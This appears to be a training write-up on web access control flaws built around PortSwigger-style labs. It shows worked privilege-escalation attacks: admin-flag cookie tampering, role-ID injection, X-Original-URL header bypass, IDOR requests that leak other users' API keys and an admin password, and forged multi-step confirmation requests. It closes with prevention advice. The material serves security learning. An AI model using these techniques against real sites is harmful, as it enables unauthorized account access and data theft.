# Access control vulnerabilities and privilege escalation

Access control, or authorization, applies constraints to determine who or what can perform actions or access requested resources. In web applications, access control relies on authentication and session management.

- **Authentication** identifies the user and confirms that they are who they say they are. 

- **Session management** identifies which subsequent HTTP requests are being made by that same user. 

- **Access control** determines whether the user is allowed to carry out the action that they are attempting to perform. 

Broken access controls are a commonly encountered and often critical security vulnerability. Design and management of access controls is a complex and dynamic problem that applies business, organizational, and legal constraints to a technical implementation. Access control design decisions have to be made by humans, not technology, and the potential for errors is high. 

### Vertical access controls

Vertical access controls restrict access to sensitive functionality that is exclusive to certain user types. They enable different levels of access to application functions based on user roles. For instance, administrators may have privileges to modify or delete any user's account, while regular users do not possess such permissions. Vertical access controls provide a detailed implementation of security models that enforce business policies like separation of duties and least privilege.

### Horizontal access controls

Horizontal access controls limit resource access to authorized users only. These controls ensure that different users can access only a specific subset of resources of the same type. For instance, in a banking application, users can view transactions and make payments from their own accounts but are restricted from accessing other users' accounts.

### Context-dependent access controls

Context-dependent access controls limit access to functionality and resources based on the application's state or user interaction.

These controls ensure that users cannot perform actions in an incorrect sequence. For instance, a retail website may restrict users from modifying the contents of their shopping cart after completing the payment process.

# Examples of broken access controls

Broken access control vulnerabilities exist when a user can in fact access some resource or perform some action that they are not supposed to be able to access. 

### Vertical privilege escalation

If a user can gain access to functionality that they are not permitted to access then this is vertical privilege escalation. For example, if a non-administrative user can in fact gain access to an admin page where they can delete user accounts, then this is vertical privilege escalation. 

### Unprotected functionality

Vertical privilege escalation occurs when an application lacks protection for sensitive functionality. For instance, administrative functions may be accessible only from an administrator's welcome page, but a user could still access them directly by browsing to the admin URL.

For example, a website might host sensitive functionality at the following URL: 

```
https://insecure-website.com/admin
```

This might in fact be accessible by any user, not only administrative users who have a link to the functionality in their user interface. In some cases, the administrative URL might be disclosed in other locations, such as the `robots.txt` file: 

    https://insecure-website.com/robots.txt

You may be able to use a `wordlist` to brute-force the location of the sensitive functionality.

#### EX1: Unprotected admin functionality

**https://example.com/**

In this example there are an unprotected admin panel 

then i tried to access `robots.txt` and I found this 

```log
User-agent: *
Disallow: /administrator-panel
```

and I accessed this admin panel `/administrator-panel`

#### EX2: Unprotected admin functionality with unpredictable URL

##### explain

In certain cases, sensitive functionality is not adequately protected but hidden using less predictable URLs, relying on security by obscurity. However, simply concealing sensitive functionality does not ensure effective access control, as users may still discover the obscured URL through various means.

For example, consider an application that hosts administrative functions at the following URL:

```
https://insecure-website.com/administrator-panel-yb556
```

While the URL may not be easily guessed by an attacker, the application could inadvertently expose it to users. For instance, the URL might be revealed in JavaScript that dynamically generates the user interface based on their role.

```html
<script>
var isAdmin = false;
if (isAdmin) {
    ...
    var adminPanelTag = document.createElement('a');
    adminPanelTag.setAttribute('https://insecure-website.com/administrator-panel-yb556');
    adminPanelTag.innerText = 'Admin panel';
    ...
}
</script>
```

 This script adds a link to the user's UI if they are an admin user. However, the script containing the URL is visible to all users regardless of their role. 

##### solve lab

In the login page, if you view the source code of the page, it will show that the JavaScript code contains the path of the admin panel![Screenshot from 2023-08-05 12-23-45](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/afb96e8f-15bc-493c-bc5f-b67632503b18)

```html
<script>
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-54cbwd');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
</script>
```

### Parameter-based access control methods

Some applications determine the user's access rights or role at login, and then store this information in a user-controllable location, such as a `hidden field`, `cookie`, or preset query `string parameter`. The application makes subsequent access control decisions based on the submitted value.

For example:

```
https://insecure-website.com/login/home.jsp?admin=true
https://insecure-website.com/login/home.jsp?role=1
```

This approach is insecure as users can modify the value and gain unauthorized access to functionalities, including administrative functions.

#### EX1: User role controlled by request parameter

**https://example.net/login**

After logging in I went to this path `/admin` and i saw this message

**Admin interface only available if logged in as an administrator** 

I captured this request and i found cookie called `Admin=fales` which I changed to `Admin=true` and got to this page as admin

```log
GET /admin HTTP/2
Host: 0ad000f504325ba38576bdc200d90075.web-security-academy.net
Cookie: session=sF3RDQmcftr8QLFDacOMRkOP0K3VsGPg; Admin=true
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0ad000f504325ba38576bdc200d90075.web-security-academy.net/admin
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

#### EX2: User role can be modified in user profile

**https://example.net/login**

After logging in I went to this path `/admin` and i saw this message

**Admin interface only available if logged in as an administrator**

Let's see all lab functions

I found `Update email` function ,Let's capture this request and show it

![Screenshot from 2023-08-05 13-32-47](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/9bad2d0b-7877-46e4-9798-ca9080d4cb06)

I found JSON and in response i found `roleid` parameter let's add it in our request and change his value to `2` then the JSON should be like this 

```json
{
    "email":"wiener@gmal.com",
     "roleid": 2
}
```

And send this request

![Screenshot from 2023-08-05 13-36-13](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/dad3a643-923c-4f45-9eca-1a087415effb)

as you can see the `roleid` changed successfully in response so let's access the `/admin` path and viewed what happend

![Screenshot from 2023-08-05 13-38-19](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/3176bd3c-9530-471c-ae34-b0da00d43258)

And we have successfully accessed the admin panel as administrator

### Broken access control resulting from platform misconfiguration

Some apps enforce access controls at the platform layer by limiting access to certain URLs and HTTP methods based on the user's role. For instance, an app might have rules like the following :

```log
DENY: POST, /admin/deleteUser, managers
```

This rule denies managers access to the `POST` method on the URL `/admin/deleteUser`. However, potential issues arise as certain application frameworks support non-standard HTTP headers `X-Original-URL`, `X-Rewrite-URL` that can override the original request's URL. If a web site has strict front-end controls for URL-based access restrictions, but the application allows URL override through request headers, it may lead to access control bypasses with requests like the following:

```log
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
...
```

#### EX1: URL-based access control can be circumvented

**https://example.net/**

when i access the `/admin` path the web server response with `Access denied`

![Screenshot from 2023-08-05 13-54-19](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/7a9c2c50-a16f-4052-a8ca-4b1f208f6d10)

Let's try to bypass this with check if the web server accepting this header

`X-Original-URL` or this `X-Rewrite-URL`

![Screenshot from 2023-08-05 20-39-28](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/d3edbfca-8fa3-4b2e-a93e-064bc1cec679)

Observe that the application returns a `not found` response. This indicates that the back-end system is processing the URL from the `X-Original-URL` header.

Then Let's Access the `/admin` path

![Screenshot from 2023-08-05 20-41-50](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/f6b77a4c-b98d-4097-bffd-4df7aec2e6e8)

![Screenshot from 2023-08-05 20-42-05](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/8414adca-b837-4783-a01c-21512739947f)

It's work and to delete carlos, add `/?username=carlos` to the real query string, and change the `X-Original-URL` path to `/admin/delete`. 

![Screenshot from 2023-08-05 20-46-42](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/50a0a089-43eb-419c-976c-dca663ae33a7)
![Screenshot from 2023-08-05 20-46-47](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/fa1309a4-8f49-4cd6-a0e2-06722b443327)

#### EX2: Method-based access control can be circumvented

An alternative attack can occur based on the HTTP method used in the request. The front-end access controls are limited to URL and HTTP method. Certain websites allow alternate HTTP methods for actions. If the attacker exploits this by using GET (or another) method on a restricted URL, they can bypass the implemented platform layer access control.

**First Login as administrator and capture the upgrad request**

![Screenshot from 2023-08-06 08-03-48](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/c2762091-9dfd-4693-9d01-61a08f2edddf)

logout and login with normal user and from `upgrad request` change request method to `GET` and change cookie in the `upgrad request` to the normal user and send 

![Screenshot from 2023-08-06 08-07-51](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/50358c45-3d2b-4819-96f1-3320068982e1)

And we can upgrad the normal user to admin user

![Screenshot from 2023-08-06 08-08-45](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/1d69f49a-90b1-44f9-9e4b-e61fde846738)

### Broken access control resulting from URL-matching discrepancies

Websites handle incoming requests differently, and discrepancies can lead to access control issues. For example, inconsistent capitalization in the path might be tolerated, causing a request like `/ADMIN/DELETEUSER` to map to `/admin/deleteUser` endpoint. This could result in access control failure if the mechanism is less tolerant.

In the `Spring` framework, enabling the `useSuffixPatternMatch` option allows paths with arbitrary file extensions to match endpoints without extensions. For instance, a request to `/admin/deleteUser.anything` would still match the `/admin/deleteUser` pattern. Prior to `Spring 5.3`, this option is enabled by default.

In some systems, discrepancies may arise between paths with and without trailing slashes. For instance, `/admin/deleteUser` and `/admin/deleteUser/` might be treated as distinct endpoints. This inconsistency could be exploited to bypass access controls by appending or removing a trailing slash in the path.

### Horizontal privilege escalation

Horizontal privilege escalation occurs when a user gains access to resources belonging to another user instead of their own. For instance, an employee should only access their employment and payroll records but can also access others' records, which is horizontal privilege escalation.

These attacks share similar exploit methods to vertical privilege escalation. For example, a user typically accesses their account page using a URL like: 

    https://insecure-website.com/myaccount?id=123

By modifying the id parameter value to that of another user, an attacker can gain access to someone else's account page along with their associated data and functions.

#### EX1: User ID controlled by request parameter

**After Login i saw page contain this**

```url
https://example.com/my-account?id=wiener
```

```html
<h1>My Account</h1>
    <div id=account-content>
        <p>
           Your username is: wiener
        </p>
        <p>
           Your email is: <span id="user-email">wiener@gmail.com</span>
        </p>
    
    <div>
        Your API Key is: zSA13M9AjAgJKirXD3XDjfBdHT1HHOo2
    </div>
```

And if you change the `id` parameter to specific user the `API` key will change

```url
https://example.com/my-account?id=carlos
```

```html
<h1>My Account</h1>
    <div id=account-content>
        <p>
           Your username is: carlos
        </p>
        <p>
           Your email is: <span id="user-email">carlos@gmail.com</span>
        </p>
    
    <div>
        Your API Key is: V4TGAZKxGTLgCDIBLHSVTvkXb7yn6qFl
    </div>
```



#### EX2: User ID controlled by request parameter, with unpredictable user IDs

In some applications, the exploitable parameter does not have a predictable value. For example, instead of an incrementing number, an application might use globally unique identifiers (GUIDs) to identify users. Here, an attacker might be unable to guess or predict the identifier for another user. However, the GUIDs belonging to other users might be disclosed elsewhere in the application where users are referenced, such as user messages or reviews. 

**After Login i saw page contain this**

```url
https://example.com/my-account?id=970db933-626c-4578-ad2b-bd29632ba4af
```

```html
<h1>My Account</h1>
    <div id=account-content>
        <p>Your username is: wiener</p>
        <div>Your API Key is: W51z7rSn2h4Ol8B9J4q9h12geQxaT3i3</div>
    </div>
```

And i searched about any post or blog post by any user for example: carlos

and after search i found blog for carlos with his `userid` and i accessed my account and change parameter `id` with calrlos `id` and i got carlos `API` key

```url
https://example.com/my-account?id=f7c8da04-ac86-42c2-a443-dac1226c240f
```

```html
<h1>My Account</h1>
    <div id=account-content>
        <p>Your username is: carlos</p>
        <div>Your API Key is: Mlc9rz7Srzp9StsNZlWO2pA5aItiACZ6</div>
    </div>
```

#### EX3: User ID controlled by request parameter with data leakage in redirect

In some cases, an application does detect when the user is not permitted to access the resource, and returns a redirect to the login page. However, the response containing the redirect might still include some sensitive data belonging to the targeted user, so the attack is still successful. 

**After Login i saw page contain this**

```url
https://example.com/my-account?id=wiener
```

```html
<h1>My Account</h1>
    <div id=account-content>
        <p>Your username is: wiener</p>
        <div>Your API Key is: KC0fDx95ubSyRvTnnVVeVuz6YwFep4ug</div>
    </div>
```

I tried to change the `id` value to any user Like: calos but it redirect me to `/login` then ,Let's capture this request and show what happend

![Screenshot from 2023-08-06 09-36-56](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/910c1f1e-7d2b-46fd-9e96-7581e5c0334b)
![Screenshot from 2023-08-06 09-37-05](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/a77fe592-6496-41d7-a8d4-0bb576ca6a9e)

As you can see it redirect me but before redirect it's leak data and calos `API` key 

### Horizontal to vertical privilege escalation

 Often, a horizontal privilege escalation attack can be turned into a vertical privilege escalation, by compromising a more privileged user. For example, a horizontal escalation might allow an attacker to reset or capture the password belonging to another user. If the attacker targets an administrative user and compromises their account, then they can gain administrative access and so perform vertical privilege escalation.

For example, an attacker might be able to gain access to another user's account page using the parameter tampering technique already described for horizontal privilege escalation:

```url
https://insecure-website.com/myaccount?id=456
```

If the target user is an application administrator, then the attacker will gain access to an administrative account page. This page might disclose the administrator's password or provide a means of changing it, or might provide direct access to privileged functionality. 

#### EX1: User ID controlled by request parameter with password disclosure

**After Login i saw page contain this**

```url
https://example/my-account?id=wiener
```

```html
<h1>My Account</h1>
<div id=account-content>
    <p>Your username is: wiener</p>
    <p>Your email is: <span id="user-email">wiener@gmail.com</span></p>
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="">
        <input required type="hidden" name="csrf" value="DAGkedRGqkg2vKe5FzGWVKLBkn1VxTgN">
        <button class='button' type='submit'> Update email </button>
    </form>
    <form class="login-form" action="/my-account/change-password" method="POST">
        <br/>
        <label>Password</label>
        <input required type="hidden" name="csrf" value="DAGkedRGqkg2vKe5FzGWVKLBkn1VxTgN">
        <input required type=password name=password value='admin'/>
        <button class='button' type='submit'> Update password </button>
    </form>
</div>
```

And when i change the `id` value to `administrator` i got his password

```url
https://example/my-account?id=administrator
```

```html
<h1>My Account</h1>
<div id=account-content>
    <p>Your username is: wiener</p>
    <p>Your email is: <span id="user-email">wiener@gmail.com</span></p>
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="">
        <input required type="hidden" name="csrf" value="DAGkedRGqkg2vKe5FzGWVKLBkn1VxTgN">
        <button class='button' type='submit'> Update email </button>
    </form>
    <form class="login-form" action="/my-account/change-password" method="POST">
        <br/>
        <label>Password</label>
        <input required type="hidden" name="csrf" value="DAGkedRGqkg2vKe5FzGWVKLBkn1VxTgN">
        <input required type=password name=password value='lx27f48vj7ohwjx50pr8'/>
        <button class='button' type='submit'> Update password </button>
    </form>
</div>
```

### Insecure direct object references

Insecure direct object references (IDOR) are access control vulnerabilities. They occur when an application allows user-supplied input to directly access objects, enabling attackers to modify the input and gain unauthorized access. IDOR gained prominence through its inclusion in the OWASP 2007 Top Ten, but it is just one of several implementation mistakes that can bypass access controls.

### Access control vulnerabilities in multi-step processes

Many websites divide essential functions into sequential steps, especially when capturing various inputs or options, or when users must review and confirm details before completing the action. For example, updating user details in an administrative function might require the following steps: 

1. Load form containing details for a specific user.

2. Submit changes.

3. Review the changes and confirm.

Websites often enforce strong access controls on certain steps but neglect others. For instance, if access controls are applied to the first and second steps but not the third, attackers can exploit this gap. By skipping the initial steps and directly submitting a request for the third step with the necessary parameters, the attacker can gain unauthorized access to the function.

#### EX1: Multi-step process with no access control on one step

**After Login with administrator to be familiarize with the admin panel**

I show in admin panel function to upgrad users to admin and this is the request

```log
POST /admin-roles HTTP/2
Host: 0a2e00ca03775e138105765800790057.web-security-academy.net
Cookie: session=ZDt1xts6dCYECCPj6A8coxiU2jAGqy0G
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a2e00ca03775e138105765800790057.web-security-academy.net
Dnt: 1
Referer: https://0a2e00ca03775e138105765800790057.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

username=carlos&action=upgrade
```

and after this request i show the page to confirm this function with upgrad or downgrad user and this is the request

```log
POST /admin-roles HTTP/2
Host: 0a2e00ca03775e138105765800790057.web-security-academy.net
Cookie: session=ZDt1xts6dCYECCPj6A8coxiU2jAGqy0G
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a2e00ca03775e138105765800790057.web-security-academy.net
Dnt: 1
Referer: https://0a2e00ca03775e138105765800790057.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

action=upgrade&confirmed=true&username=carlos
```

![Screenshot from 2023-08-06 14-10-07](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/96e49a64-0795-43f3-aabc-5235f06f9309)

then let's logout and login with normal user like : wiener

and after login send the confirm request to repeater and change the parameter `username` to `wiener` and from any request with wiener copy cookie of wiener and replace it with the old cookie in the confirm request and the request should be like this:

```log
POST /admin-roles HTTP/2
Host: 0a2e00ca03775e138105765800790057.web-security-academy.net
Cookie: session=bQwRae4yJUW31KJZyAk8TjnO3rpzzPwL
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://0a2e00ca03775e138105765800790057.web-security-academy.net
Dnt: 1
Referer: https://0a2e00ca03775e138105765800790057.web-security-academy.net/admin-roles
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

action=upgrade&confirmed=true&username=wiener
```

And if you send this request the `winer` will be admin

### Referer-based access control

Websites use the `Referer` header in HTTP requests for access controls. It indicates the page from which a request was initiated.

For example, an application strongly enforces access control on the main administrative page at `/admin`, but for sub-pages like `/admin/deleteUser`, it only inspects the `Referer` header. If the `Referer` header contains the main `/admin` URL, the request is allowed.

Attackers can exploit this by forging direct requests to sensitive sub-pages, supplying the required `Referer` header they control, and gaining unauthorized access.

### Location-based access control

Some web sites enforce access controls over resources based on the user's geographical location. This can apply, for example, to banking applications or media services where state legislation or business restrictions apply. These access controls can often be circumvented by the use of web proxies, VPNs, or manipulation of client-side geolocation mechanisms.

# How to prevent access control vulnerabilities

Access control vulnerabilities can generally be prevented by taking a defense-in-depth approach and applying the following principles:

- Never rely on obfuscation alone for access control.

- Unless a resource is intended to be publicly accessible, deny access by default.

- Wherever possible, use a single application-wide mechanism for enforcing access controls.

- At the code level, make it mandatory for developers to declare the access that is allowed for each resource, and deny access by default.

- Thoroughly audit and test access controls to ensure they are working as designed.




























